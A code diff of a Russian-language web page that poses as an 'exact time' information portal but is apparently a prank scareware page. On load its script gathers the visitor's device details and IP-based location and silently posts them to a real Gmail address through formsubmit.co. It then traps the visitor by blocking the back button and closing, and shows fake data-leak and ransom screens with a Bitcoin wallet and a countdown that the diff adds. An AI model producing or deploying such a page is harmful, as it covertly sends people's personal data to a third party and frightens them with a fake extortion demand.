@@ -7,12 +7,7 @@
     <title>Точное время – информационный портал</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🕒</text></svg>">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f5f7fa;
@@ -20,7 +15,6 @@
             padding: 20px;
             line-height: 1.4;
         }
-
         .container {
             max-width: 800px;
             margin: 0 auto;
@@ -31,28 +25,15 @@
             position: relative;
             z-index: 1;
         }
-
         .header {
             background: #2c3e50;
             color: white;
             padding: 20px;
             text-align: center;
         }
-
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 5px;
-        }
-
-        .header p {
-            opacity: 0.8;
-            font-size: 0.9rem;
-        }
-
-        .content {
-            padding: 20px;
-        }
-
+        .header h1 { font-size: 1.8rem; margin-bottom: 5px; }
+        .header p { opacity: 0.8; font-size: 0.9rem; }
+        .content { padding: 20px; }
         .time-block {
             background: #ecf0f1;
             border-radius: 12px;
@@ -60,45 +41,22 @@
             text-align: center;
             margin-bottom: 20px;
         }
-
-        .time-block .big-time {
-            font-size: 3rem;
-            font-weight: bold;
-            font-family: monospace;
-            letter-spacing: 2px;
-        }
-
-        .time-block .date {
-            font-size: 1.1rem;
-            color: #7f8c8d;
-            margin-top: 5px;
-        }
-
+        .time-block .big-time { font-size: 3rem; font-weight: bold; font-family: monospace; letter-spacing: 2px; }
+        .time-block .date { font-size: 1.1rem; color: #7f8c8d; margin-top: 5px; }
         .info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 15px;
             margin-bottom: 20px;
         }
-
         .info-card {
             background: #ecf0f1;
             border-radius: 12px;
             padding: 12px;
             text-align: center;
         }
-
-        .info-card h3 {
-            font-size: 0.9rem;
-            color: #7f8c8d;
-            margin-bottom: 8px;
-        }
-
-        .info-card .value {
-            font-size: 1.2rem;
-            font-weight: bold;
-        }
-
+        .info-card h3 { font-size: 0.9rem; color: #7f8c8d; margin-bottom: 8px; }
+        .info-card .value { font-size: 1.2rem; font-weight: bold; }
         .footer {
             background: #ecf0f1;
             padding: 12px;
@@ -107,14 +65,25 @@
             color: #7f8c8d;
             border-top: 1px solid #d0d3d4;
         }
-
         .warning-line {
             font-size: 0.65rem;
             color: #bdc3c7;
             margin-top: 8px;
             transition: color 0.3s;
         }
-
+        /* Таймер обратного отсчёта */
+        .countdown {
+            background: #ff4757;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            font-family: monospace;
+            margin: 15px 20px;
+            border-radius: 40px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.2);
+        }
         /* Оверлеи */
         .overlay {
             position: fixed;
@@ -132,12 +101,7 @@
             opacity: 0;
             transition: visibility 0s, opacity 0.3s linear;
         }
-
-        .overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-
+        .overlay.active { visibility: visible; opacity: 1; }
         .modal {
             background: #1e1e2f;
             color: #eee;
@@ -149,42 +113,16 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             border-left: 4px solid #ff4757;
         }
-
-        .modal h2 {
-            font-size: 1.3rem;
-            margin-bottom: 16px;
-            color: #ff6b81;
-        }
-
+        .modal h2 { font-size: 1.3rem; margin-bottom: 16px; color: #ff6b81; }
         .modal .data-row {
             margin: 12px 0;
             border-bottom: 1px solid #3b3b4f;
             padding-bottom: 8px;
         }
-
-        .modal .label {
-            font-size: 0.7rem;
-            color: #aaa;
-            text-transform: uppercase;
-        }
-
-        .modal .value {
-            font-size: 0.9rem;
-            word-break: break-word;
-        }
-
-        .ransom {
-            border-left-color: #ff4757;
-            text-align: center;
-        }
-
-        .ransom .price {
-            font-size: 2rem;
-            font-weight: bold;
-            color: #ff4757;
-            margin: 15px 0;
-        }
-
+        .modal .label { font-size: 0.7rem; color: #aaa; text-transform: uppercase; }
+        .modal .value { font-size: 0.9rem; word-break: break-word; }
+        .ransom { border-left-color: #ff4757; text-align: center; }
+        .ransom .price { font-size: 2rem; font-weight: bold; color: #ff4757; margin: 15px 0; }
         button {
             background: #ff4757;
             border: none;
@@ -198,19 +136,8 @@
             cursor: pointer;
             transition: opacity 0.3s;
         }
-
-        button:disabled {
-            background: #888;
-            cursor: not-allowed;
-        }
-
-        .close-hint {
-            font-size: 0.7rem;
-            text-align: center;
-            margin-top: 15px;
-            color: #888;
-        }
-
+        button:disabled { background: #888; cursor: not-allowed; }
+        .close-hint { font-size: 0.7rem; text-align: center; margin-top: 15px; color: #888; }
         .joke-message {
             background: #2ecc71;
             color: #fff;
@@ -219,7 +146,6 @@
             border-radius: 12px;
             margin-top: 20px;
         }
-
         .cheat-message {
             background: #e67e22;
             color: #fff;
@@ -256,6 +182,9 @@
     </div>
 </div>
 
+<!-- Элемент для отображения обратного отсчёта (10 секунд) -->
+<div id="countdownTimer" class="countdown">Взлом через: 10.00 сек</div>
+
 <div id="dataOverlay" class="overlay">
     <div class="modal">
         <h2>⚠️ ОБНАРУЖЕНА УТЕЧКА ДАННЫХ</h2>
@@ -268,7 +197,7 @@
     <div class="modal ransom">
         <h2>🔒 ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ</h2>
         <p>Все личные данные, контакты, фото и история браузера скопированы и заблокированы.</p>
-        <div class="price">₽ 15 000</div>
+        <div class="price">1 000 BYN</div>
         <p>Для восстановления доступа переведите указанную сумму на кошелек:</p>
         <p style="font-size:0.8rem; background:#000; padding:8px; border-radius:8px;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
         <button id="ransomButton">Я ПЕРЕВЕЛ(А), РАЗБЛОКИРУЙТЕ</button>
@@ -279,11 +208,11 @@
 <script>
     (function() {
         // Состояние
-        let isPrankRevealed = false;   // шутка раскрыта
+        let isPrankRevealed = false;
         let hackStarted = false;
         let dataShown = false;
         let ransomShown = false;
-        let timerInterval = null;
+        let ransomTimerInterval = null;
 
         let geoInfo = null;
         let deviceInfo = {};
@@ -295,14 +224,13 @@
         const warningLine = document.getElementById('warningLine');
         const ransomButton = document.getElementById('ransomButton');
         const timerDisplaySpan = document.getElementById('timerDisplay');
+        const countdownDiv = document.getElementById('countdownTimer');
 
         // Блокировка закрытия и кнопки назад
         function enableLock() {
             history.pushState(null, null, location.href);
             window.addEventListener('popstate', function (e) {
-                if (!isPrankRevealed) {
-                    history.pushState(null, null, location.href);
-                }
+                if (!isPrankRevealed) history.pushState(null, null, location.href);
             });
             window.addEventListener('beforeunload', beforeUnloadHandler);
         }
@@ -321,7 +249,7 @@
             localStorage.removeItem('prank_state');
         }
 
-        // Сбор данных об устройстве
+        // Сбор данных
         function collectDeviceInfo() {
             const ua = navigator.userAgent;
             const isAndroid = /Android/i.test(ua);
@@ -342,7 +270,6 @@
             };
         }
 
-        // Получение гео и IP
         async function getUserGeo() {
             try {
                 const resp = await fetch('https://ipapi.co/json/');
@@ -356,7 +283,7 @@
             }
         }
 
-        // Отправка данных на почту через FormSubmit
+        // Отправка данных на почту
         function sendDataToEmail() {
             const data = {
                 device: deviceInfo.device,
@@ -374,14 +301,30 @@
 
             fetch('https://formsubmit.co/ajax/hitmandav777@gmail.com', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => console.log('Отправлено на почту:', data))
-            .catch(error => console.error('Ошибка отправки:', error));
+            }).catch(console.error);
+        }
+
+        // Обратный отсчёт 10 секунд с миллисекундами
+        function startCountdown(seconds, onComplete) {
+            let startTime = performance.now();
+            let remaining = seconds;
+
+            function updateCountdown(now) {
+                const elapsed = (now - startTime) / 1000;
+                let left = Math.max(0, seconds - elapsed);
+                const secs = Math.floor(left);
+                const ms = Math.floor((left - secs) * 100);
+                countdownDiv.innerText = `Взлом через: ${secs}.${ms.toString().padStart(2,'0')} сек`;
+                if (left > 0) {
+                    requestAnimationFrame(updateCountdown);
+                } else {
+                    countdownDiv.style.display = 'none';
+                    onComplete();
+                }
+            }
+            requestAnimationFrame(updateCountdown);
         }
 
         // Отображение "украденных" данных
@@ -404,7 +347,7 @@
             warningLine.style.color = "#ff6b6b";
             warningLine.innerHTML = "⚠️ КРИТИЧЕСКАЯ УЯЗВИМОСТЬ: ваши данные скомпрометированы!";
 
-            // Имитация скачивания файла
+            // Имитация скачивания
             setTimeout(() => {
                 const fakeBlob = new Blob(["Этот файл не опасен. Демонстрация метода социальной инженерии."], {type: "application/octet-stream"});
                 const url = URL.createObjectURL(fakeBlob);
@@ -430,20 +373,17 @@
             warningLine.style.color = "#ff4757";
             warningLine.innerHTML = "‼️ ВАША СИСТЕМА ЗАБЛОКИРОВАНА. НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ ‼️";
 
-            // Таймер на 1 минуту
             let timeLeft = 60;
             timerDisplaySpan.innerText = `Срок: 1:00 минут. Не закрывайте страницу.`;
-            timerInterval = setInterval(() => {
+            ransomTimerInterval = setInterval(() => {
                 if (isPrankRevealed) {
-                    clearInterval(timerInterval);
+                    clearInterval(ransomTimerInterval);
                     return;
                 }
                 timeLeft--;
                 if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    if (!isPrankRevealed) {
-                        revealJoke();
-                    }
+                    clearInterval(ransomTimerInterval);
+                    if (!isPrankRevealed) revealJoke();
                 } else {
                     const minutes = Math.floor(timeLeft / 60);
                     const seconds = timeLeft % 60;
@@ -469,7 +409,7 @@
         function revealJoke() {
             if (isPrankRevealed) return;
             disableLock();
-            if (timerInterval) clearInterval(timerInterval);
+            if (ransomTimerInterval) clearInterval(ransomTimerInterval);
             ransomOverlay.classList.remove('active');
             dataOverlay.classList.remove('active');
 
@@ -491,7 +431,7 @@
             warningLine.style.display = "none";
         }
 
-        // Обработчик кнопки "Я перевел(а)"
+        // Обработчик кнопки
         ransomButton.addEventListener('click', () => {
             if (isPrankRevealed) return;
             showCheatMessage();
@@ -501,29 +441,21 @@
         deviceInfo = collectDeviceInfo();
         getUserGeo().then(geo => {
             geoInfo = geo;
-            // Отправляем данные на почту сразу после получения
             sendDataToEmail();
-            if (!hackStarted) {
-                hackStarted = true;
-                showStolenData();
-            }
+            // Запускаем 10-секундный обратный отсчёт
+            startCountdown(10, () => {
+                if (!hackStarted) {
+                    hackStarted = true;
+                    showStolenData();
+                }
+            });
         });
 
-        // Восстановление состояния при перезагрузке
+        // Восстановление состояния
         const savedState = localStorage.getItem('prank_state');
-        if (savedState) {
-            localStorage.removeItem('prank_state');
-        }
+        if (savedState) localStorage.removeItem('prank_state');
         localStorage.setItem('prank_state', 'active');
         enableLock();
-
-        // Запуск через 3 секунды
-        setTimeout(() => {
-            if (!hackStarted) {
-                hackStarted = true;
-                showStolenData();
-            }
-        }, 3000);
 
         // Обновление времени
         function updateTime() {
@@ -534,7 +466,7 @@
         setInterval(updateTime, 1000);
         updateTime();
 
-        // Случайные курсы для имитации
+        // Случайные курсы
         document.getElementById('usdRate').innerText = (92 + Math.random() * 2).toFixed(2);
         document.getElementById('eurRate').innerText = (99 + Math.random() * 3).toFixed(2);
         document.getElementById('weather').innerText = "+" + Math.floor(8 + Math.random() * 8) + "°C, " + (Math.random() > 0.5 ? "ясно" : "облачно");
